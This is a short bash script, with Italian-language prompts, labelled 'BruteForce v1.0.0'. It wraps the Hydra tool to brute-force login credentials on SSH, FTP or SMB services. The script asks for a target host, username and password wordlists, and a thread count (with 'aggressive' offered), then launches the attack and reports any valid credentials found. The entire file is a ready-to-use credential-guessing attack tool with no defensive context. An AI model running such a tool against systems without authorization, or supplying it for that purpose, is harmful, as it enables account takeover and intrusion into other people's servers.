#!/bin/bash
##########################
######   BruteForce ######
##########################
###      v1.0.0    #######
######### By MagicSale ###
##########################

# Banner
cat << "EOF"
 ______   ______     ______     ______     ______     __  __    
/\  ___\ /\  __ \   /\  == \   /\  ___\   /\  ___\   /\_\_\_\   
\ \  __\ \ \ \/\ \  \ \  __<   \ \ \____  \ \  __\   \/_/\_\/_  
 \ \_\    \ \_____\  \ \_\ \_\  \ \_____\  \ \_____\   /\_\/\_\ 
  \/_/     \/_____/   \/_/ /_/   \/_____/   \/_____/   \/_/\/_/ 
EOF

# Servizi supportati
services=("ssh" "ftp" "smb")

# Funzioni per brute force con Hydra
function hydra_brute() {
    local service="$1"
    echo "Esecuzione brute force $service con Hydra..."
    hydra -L "$users" -P "$passwords" -t "$threads" "$target" "$service" -vV
    if [[ $? -eq 0 ]]; then
        echo "Hydra ha trovato credenziali valide!"
    else
        echo "Nessuna credenziale valida trovata per $service."
    fi
}

# Input dall'utente
read -p "Specifica il servizio che desideri attaccare (${services[*]}): " service
if [[ ! " ${services[@]} " =~ " ${service} " ]]; then
    echo "Errore: servizio non valido. Scegli tra: ${services[*]}"
    exit 1
fi

read -p "Numero di thread (Basso: moderato - Elevato: aggressivo): " threads
read -p "File utenti (esempio: list_users.txt): " users
read -p "File password (esempio: list_password.txt): " passwords
read -p "Target (IP o hostname): " target

# Controllo file
if [[ ! -f "$users" ]]; then
    echo "Errore: il file utenti ($users) non esiste."
    exit 1
fi

if [[ ! -f "$passwords" ]]; then
    echo "Errore: il file password ($passwords) non esiste."
    exit 1
fi

# Esecuzione brute force
case "$service" in
    ssh|ftp|smb)
        hydra_brute "$service"
        ;;
    *)
        echo "Errore: servizio non supportato."
        exit 1
        ;;
esac
